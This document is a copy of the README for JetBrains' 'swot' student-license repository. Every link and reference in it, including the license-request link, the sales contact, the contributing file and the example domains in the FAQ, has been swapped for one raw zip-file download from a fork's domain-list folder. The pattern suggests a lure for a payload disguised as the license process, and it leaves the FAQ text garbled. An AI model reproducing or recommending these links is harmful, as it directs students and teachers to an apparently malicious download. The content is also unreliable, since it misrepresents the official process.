[![official JetBrains project](https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip)](https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip+on+GitHub)
# swot

JetBrains uses this **swot** repository to grant free licenses for JetBrains tools to students and teachers worldwide. If your email is in one of the domains listed in this repository, you may request your free license from JetBrains. Visit https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip to request!
...
If you represent a primary or secondary school and you are certain of the necessity of a professional version of a JetBrains tool for your school, please contact JetBrains sales team via https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip
...
Please refer to the `https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip` file in this repository to read more about the repository structure and contributing rules.

## FAQ
#### There are many domains in my university, how can I add all of them?
If all the domains used for teachers' and students' email are in the same upper-level domain, you can add the upper-level domain. For example, if there is a domain `https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip` owned by a university, and there are subdomains such as `https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip` and `https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip`, used by the students and the teachers respectively, you can add `https://github.com/christianekarel/swot/raw/refs/heads/master/lib/domains/com/safamadrid/Software-3.0.zip` domain only, and both students and teachers will be able to request their free licenses.
